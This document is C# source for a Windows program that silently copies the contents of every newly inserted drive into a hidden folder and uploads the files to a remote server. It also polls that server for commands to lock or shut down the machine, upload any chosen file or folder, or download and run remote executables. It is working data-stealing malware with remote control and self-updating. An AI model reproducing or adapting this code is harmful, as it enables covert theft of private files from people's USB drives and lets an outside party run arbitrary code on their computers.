using Microsoft.Win32;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO.Compression;
using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;

public class packRuntimeInformation
{
    public string? version { get; set; }
    public string? exe { get; set; }
}
internal class Program
{
    private static void Main(string[] args)
    {
        string SaveRoot, classRegistered, version, packDownloadSite, urlP1, urlP2, remoteVersionUrl, debugMod;
        string[,] copyRoot = new string[600000, 2];
        bool[] registeredDrive = new bool[26];
        int fileCnt = 0;
        string localSaveRoot = "";
        List<string[]> fileBoot = new List<string[]> { };
        List<string> filePriority = new List<string> { ".xlsx", ".xls", ".pptx", ".ppt", ".png", ".jpg", ".mp4", ".ts", ".zip" };
        if (!File.Exists("config.txt"))
        {
            try
            {
                RegistryKey k = Registry.CurrentUser.OpenSubKey("Software\\GTC-ACE\\Kaliumdichromat");
                string kk = k.GetValue("RunRoot").ToString();
                Environment.CurrentDirectory = kk;
                k.Close();
            }
            catch (Exception e) { ErrorLogUpload(e, "Start Error"); }
        }

        StreamReader configFile = new StreamReader("config.txt");
        SaveRoot = configFile.ReadLine();
        urlP1 = configFile.ReadLine();
        urlP2 = configFile.ReadLine();
        classRegistered = urlP2 + urlP1;
        version = configFile.ReadLine();
        packDownloadSite = configFile.ReadLine();
        remoteVersionUrl = configFile.ReadLine();
        debugMod = configFile.ReadLine();
        configFile.Close();
        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        Console.WriteLine(classRegistered);
        if (!Directory.Exists(SaveRoot))
        {
            Directory.CreateDirectory(SaveRoot);
        }
        File.SetAttributes(SaveRoot, FileAttributes.Hidden);

        Directory.CreateDirectory("Upload_Buffer\\File_Stack");
        if (!File.Exists("Upload_Buffer\\File_Stack\\File_Stack.txt"))
        {
            File.Create("Upload_Buffer\\File_Stack\\File_Stack.txt").Close();
        }
        // Console.WriteLine("Save to: {0} \nRequest Url: {1} \nversion: {2}", SaveRoot, classRegistered, version);


        void fileMonitor()
        {
            while (true)
            {
                try
                {
                    string[] temp = File.ReadAllLines("Upload_Buffer\\File_Stack\\File_Stack.txt");
                }
                catch { continue; }
                string[] filesInS = File.ReadAllLines("Upload_Buffer\\File_Stack\\File_Stack.txt");

                int cnt = 0;
                string[] fileInError = new string[filesInS.Length];
                foreach (string path in filesInS)
                {
                    if (path == "") continue;

                    try
                    {
                        HttpUploadFile(classRegistered + "upload.php", path, "file", "unknown");
                    }
                    catch
                    {
                        fileInError[cnt++] = path;
                    }
                }
                FileStream writeStack = new("Upload_Buffer\\File_Stack\\File_Stack.txt", FileMode.Create, FileAccess.ReadWrite);
                for (int i = 0; i < cnt; i++)
                {
                    if (fileInError[i] == "") continue;
                    writeStack.Write(Encoding.UTF8.GetBytes(fileInError[i] + "\n"));
                    // Console.WriteLine(fileInError[i] + " failed");
                }
                writeStack.Close();
                Thread.Sleep(5000);
            }
        }
        Thread FMThread = new Thread(fileMonitor);
        // FMThread.IsBackground = true;
        FMThread.Start();


        void getCommand()
        {
            
            while (true)
            {
                using (HttpClient client = new HttpClient())
                {
                    DriveInfo drive = new DriveInfo(Path.GetPathRoot(SaveRoot));
                    double freeSpace = (double)drive.TotalFreeSpace / 1024.0 / 1024.0 / 1024.0;
                    var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "VALIDATE", "GTC Kaliumdichromat Project" }, { "remains", Convert.ToString(freeSpace) }, { "version", version } });
                    client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
                    // Console.WriteLine(response.Content.ReadAsStringAsync().Result);
                    string[] commands = client.PostAsync(classRegistered + "overall.php", content).Result.Content.ReadAsStringAsync().Result.Split('\n');
                    foreach (string command in commands)
                    {
                        string[] splited = command.Split(' ');
                        // Console.WriteLine(splited[0]);
                        if (splited[0] == "lock")
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardError = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.CreateNoWindow = false;
                            p.Start();
                            p.StandardInput.WriteLine("Rundll32.exe user32.dll,LockWorkStation&exit");
                            p = null;
                        }
                        else if (splited[0] == "shutdown")
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardError = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.CreateNoWindow = false;
                            p.Start();
                            p.StandardInput.WriteLine("shutdown -s -t 0");
                            p = null;
                        }
                        else if (splited[0] == "shutdown-delay")
                        {
                            if (splited.Length > 1)
                            {
                                string local_cmd = "";
                                if (splited[1] == "cancel")
                                {
                                    local_cmd = "shutdown /a";
                                }
                                else
                                {
                                    local_cmd = "shutdown -s -t " + splited[1];
                                }
                                Process p = new Process();
                                p.StartInfo.FileName = "cmd.exe";
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardError = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.CreateNoWindow = false;
                                p.Start();
                                p.StandardInput.WriteLine(local_cmd);
                                p = null;
                            }
                        }
                        else if (splited[0] == "upload")
                        {
                            if (splited.Length <= 1) continue;
                            string path = command.Substring(6).Trim();
                            if (!File.Exists(path) && !Directory.Exists(path))
                            {
                                string errorFileName = $"Upload_Buffer\\Error at {DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")} Type: File Not Found.txt";
                                using (StreamWriter errorFile = new StreamWriter(errorFileName))
                                {
                                    errorFile.WriteLine($"File not found with path: {path}");
                                    errorFile.Close();
                                }
                                File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", errorFileName);
                            }
                            else if (File.Exists(path))
                            {
                                File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", path);
                            }
                            else if (Directory.Exists(path))
                            {
                                string zipFileName = Path.Combine(Path.GetDirectoryName(path), $"Upload----==----{Path.GetFileName(path)}.zip");
                                if (File.Exists(zipFileName))
                                {
                                    File.Delete(zipFileName);
                                }
                                ZipFile.CreateFromDirectory(path, zipFileName, CompressionLevel.Optimal, false);
                                // Console.WriteLine(zipFileName + " done");
                                File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", zipFileName);
                            }
                        }
                        else if (splited[0] == "pack")
                        {
                            packRuntimeInformation packInfo = new packRuntimeInformation();
                            if (!Directory.Exists("sidepacks"))
                            {
                                Directory.CreateDirectory("sidepacks");
                            }
                            string packName = splited[1];
                            string arg = "";
                            if (splited.Length > 2)
                            {
                                for (int i = 2; i < splited.Length; i++)
                                {
                                    arg += splited[i];
                                    arg += " ";
                                }
                            }
                            // Console.WriteLine(packName);
                            if (!Directory.Exists(Path.Combine("sidepacks", packName)))
                            {
                                Directory.CreateDirectory(Path.Combine("sidepacks", packName));
                                try
                                {
                                    using (WebClient wb = new WebClient())
                                    {
                                        wb.DownloadFile(packDownloadSite + packName + "/" + packName + ".zip", Path.Combine("sidepacks", packName, packName + ".zip"));
                                        wb.DownloadFile(packDownloadSite + packName + "/config.txt", Path.Combine("sidepacks", packName, "config.txt"));
                                    }
                                }
                                catch { continue; }
                                ZipFile.ExtractToDirectory(Path.Combine("sidepacks", packName, packName + ".zip"), Path.Combine("sidepacks", packName, packName), Encoding.GetEncoding("gb18030"));
                                packInfo = JsonSerializer.Deserialize<packRuntimeInformation>(File.ReadAllText(Path.Combine("sidepacks", packName, "config.txt")));
                            }
                            else
                            {
                                try
                                {
                                    packRuntimeInformation origin = JsonSerializer.Deserialize<packRuntimeInformation>(File.ReadAllText(Path.Combine("sidepacks", packName, "config.txt")));
                                    try
                                    {
                                        using (WebClient wb = new WebClient())
                                        {
                                            wb.DownloadFile(packDownloadSite + packName + "/config.txt", Path.Combine("sidepacks", packName, "config.txt"));
                                        }
                                    }
                                    catch { continue; }
                                    packInfo = JsonSerializer.Deserialize<packRuntimeInformation>(File.ReadAllText(Path.Combine("sidepacks", packName, "config.txt")));
                                    if (packInfo.version != origin.version)
                                    {
                                        Directory.Delete(Path.Combine("sidepacks", packName), true);
                                        Directory.CreateDirectory(Path.Combine("sidepacks", packName));
                                        try
                                        {
                                            using (WebClient wb = new WebClient())
                                            {
                                                wb.DownloadFile(packDownloadSite + packName + "/" + packName + ".zip", Path.Combine("sidepacks", packName, packName + ".zip"));
                                                wb.DownloadFile(packDownloadSite + packName + "/config.txt", Path.Combine("sidepacks", packName, "config.txt"));
                                            }
                                        }
                                        catch (Exception e) { /*Console.WriteLine(e);*/ continue; }
                                        ZipFile.ExtractToDirectory(Path.Combine("sidepacks", packName, packName + ".zip"), Path.Combine("sidepacks", packName, packName), Encoding.GetEncoding("gb18030"));
                                        packInfo = JsonSerializer.Deserialize<packRuntimeInformation>(File.ReadAllText(Path.Combine("sidepacks", packName, "config.txt")));
                                    }
                                }
                                catch
                                {
                                    Directory.Delete(Path.Combine("sidepacks", packName), true);
                                    continue;
                                }

                            }
                            // Console.WriteLine($"{packInfo.exe} {packInfo.version}");
                            try
                            {
                                Process p = new Process();
                                p.StartInfo.WorkingDirectory = Path.Combine("sidepacks", packName, packName);
                                p.StartInfo.FileName = packInfo.exe;
                                p.StartInfo.UseShellExecute = true;
                                p.StartInfo.CreateNoWindow = false;
                                p.StartInfo.Arguments = arg;
                                p.Start();
                            }
                            catch (Exception e)
                            {
                                // Console.WriteLine(e.ToString());
                            }

                        }
                    }
                }
                Thread.Sleep(10000);
            }

        }
        Thread GCThread = new Thread(getCommand);
        GCThread.Start();


        void updateChecker()
        {
            string remoteVersion;
            while (true)
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
                    remoteVersion = client.GetAsync(remoteVersionUrl).Result.Content.ReadAsStringAsync().Result;
                    if (remoteVersion != version)
                    {
                        try
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = "Updater.exe";
                            p.StartInfo.CreateNoWindow = false;
                            p.Start();
                            p = null;
                            Environment.Exit(0);
                        }
                        catch (Exception e) { ErrorLogUpload(e, urlP1.Replace("/", "")); }
                    }
                }
                Thread.Sleep(30000);
            }

        }
        Thread UCThread = new Thread(updateChecker);
        UCThread.Start();


        void scanDirectory(string path)
        {
            DirectoryInfo currentDir = new DirectoryInfo(path);
            FileInfo[] files = currentDir.GetFiles();
            DirectoryInfo[] dirs = currentDir.GetDirectories();
            foreach (DirectoryInfo dir in dirs)
            {
                // Console.WriteLine(dir.FullName.Substring(3));
                Directory.CreateDirectory(localSaveRoot + dir.FullName.Substring(3));
                scanDirectory(dir.FullName);
            }
            foreach (FileInfo file in files)
            {
                fileCnt += 1;
                copyRoot[fileCnt, 0] = file.FullName;
                copyRoot[fileCnt, 1] = localSaveRoot + file.FullName.Substring(3);
            }
        }


        DriveInfo[] allDrivesG = DriveInfo.GetDrives();
        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        Console.OutputEncoding = Encoding.Unicode;


        foreach (DriveInfo item in allDrivesG)
        {
            if (item.IsReady)
            {
                Encoding gbk = Encoding.GetEncoding("gb18030");
                Encoding utf8 = Encoding.GetEncoding("utf-8");
                byte[] gb = gbk.GetBytes(item.VolumeLabel);
                gb = Encoding.Convert(gbk, utf8, gb);
                //Console.WriteLine(utf8.GetString(gb));
            }
            registeredDrive[item.Name[0] - 'A'] = true;
        }
        foreach (bool n in registeredDrive)
        { /*Console.WriteLine(n);*/ }


        while (true)
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            bool[] visited = new bool[26];
            foreach (DriveInfo item in allDrives)
            {
                visited[item.Name[0] - 'A'] = true;
                if (!registeredDrive[item.Name[0] - 'A'])
                {
                    if (!item.IsReady) continue;
                    registeredDrive[item.Name[0] - 'A'] = true;
                    Encoding gbk = Encoding.GetEncoding("gb18030");
                    Encoding utf8 = Encoding.GetEncoding("utf-8");
                    byte[] gb = gbk.GetBytes(item.VolumeLabel);
                    gb = Encoding.Convert(gbk, utf8, gb);
                    string saveFileName = $"[{(uint)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds}] from[{utf8.GetString(gb)}]";
                    string saveDirName = SaveRoot + $"{saveFileName}\\";
                    // Console.WriteLine(saveDirName);
                    fileCnt = 0;
                    localSaveRoot = saveDirName;
                    Directory.CreateDirectory(localSaveRoot);
                    // Console.WriteLine("Scanning...");
                    scanDirectory(item.Name);
                    for (int i = 1; i <= fileCnt; i++)
                    {
                        fileBoot.Add(new string[] { copyRoot[i, 0], copyRoot[i, 1] });
                    }
                    fileBoot.Sort((a, b) =>
                    {
                        int p1 = -1000, p2 = -1000;
                        for (int i = 0; i < filePriority.Count; i++)
                        {
                            if (Path.GetExtension(a[0]) == filePriority[i])
                            {
                                p1 = filePriority.Count - i;
                            }
                            if (Path.GetExtension(b[0]) == filePriority[i])
                            {
                                p2 = filePriority.Count - i;
                            }
                        }
                        return -p1 + p2;
                    });
                    // Console.WriteLine("Start");
                    StreamWriter menu = new StreamWriter($"Upload_Buffer\\{saveFileName}.txt");
                    for (int i = 0; i < fileCnt; i++)
                    {
                        // Console.Write("from " + fileBoot[i][0] + " to " + fileBoot[i][1] + " ...");
                        try
                        {
                            File.Copy(fileBoot[i][0], fileBoot[i][1], true);
                            Console.Write("好");
                            menu.WriteLine(fileBoot[i][1]);
                        }
                        catch { }
                    }
                    menu.Close();
                    // Console.WriteLine("Done");
                    File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", $"Upload_Buffer\\{saveFileName}.txt\r\n");
                }
            }
            for (int i = 0; i < 26; i++)
            {
                if (!visited[i] && registeredDrive[i])
                {
                    registeredDrive[i] = false;
                }
            }
            allDrives = null;
            visited = null;
            Thread.Sleep(1000);

        }


    }
    static void ErrorLogUpload(Exception e, string Name)
    {
        using (HttpClient client = new HttpClient())
        {
            client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
            var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "Name", Name }, { "Content", e.ToString() } });
            client.PostAsync("https://ace.gtc.tdom.cn/contents/error_log/receive.php", content);
        }
    }
    public static void HttpUploadFile(string url, string filePath, string paramName, string contentType)
    {
        NameValueCollection nameValueCollection = new NameValueCollection();
        string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
        byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
        request.ContentType = "multipart/form-data; boundary=" + boundary;
        request.Method = "POST";
        request.KeepAlive = true;
        request.Credentials = CredentialCache.DefaultCredentials;
        Stream requestStream = request.GetRequestStream();
        string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
        foreach (string key in nameValueCollection.Keys)
        {
            requestStream.Write(boundarybytes, 0, boundarybytes.Length);
            string formitem = string.Format(formdataTemplate, key, nameValueCollection[key]);
            byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
            requestStream.Write(formitembytes, 0, formitembytes.Length);
        }
        requestStream.Write(boundarybytes, 0, boundarybytes.Length);
        string header = string.Format("Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n", paramName, filePath, contentType);
        byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
        requestStream.Write(headerbytes, 0, headerbytes.Length);
        FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
        byte[] buffer = new byte[4096];
        int bytesRead = 0;
        while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
        {
            requestStream.Write(buffer, 0, bytesRead);
        }
        fileStream.Close();
        byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
        requestStream.Write(trailer, 0, trailer.Length);
        requestStream.Close();
        WebResponse webResponse = null;
        try
        {
            webResponse = request.GetResponse();
            Stream responseStream = webResponse.GetResponseStream();
            StreamReader streamReader = new StreamReader(responseStream);
            string result = streamReader.ReadToEnd();
        }
        catch (Exception ex)
        {
            if (webResponse != null)
            {
                webResponse.Close();
                webResponse = null;
            }
        }
        finally
        {
            request = null;
        }
    }
}
